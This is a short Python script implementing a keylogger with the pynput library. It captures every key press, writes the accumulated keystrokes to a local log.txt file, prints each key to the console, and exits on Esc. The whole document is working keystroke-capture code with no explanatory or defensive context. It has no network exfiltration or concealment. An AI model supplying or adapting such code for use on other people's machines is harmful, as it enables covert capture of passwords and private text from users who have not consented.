from pynput import keyboard

class KeyLogger:
    def __init__(self, log_file='log.txt'):
        self.keys = []
        self.log_file = log_file

    def on_press(self, key):
        self.keys.append(key)
        self._write_to_file()

        if hasattr(key, 'char') and key.char is not None:
            print(f'Alphanumeric key {key.char} pressed')
        else:
            print(f'Special key {key} pressed')

    def _write_to_file(self):
        with open(self.log_file, 'w') as file:
            for key in self.keys:
                key_str = str(key).replace("'", "")
                file.write(f'{key_str} ')
                
    def on_release(self, key):
        print(f'{key} released')
        if key == keyboard.Key.esc:
            return False

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
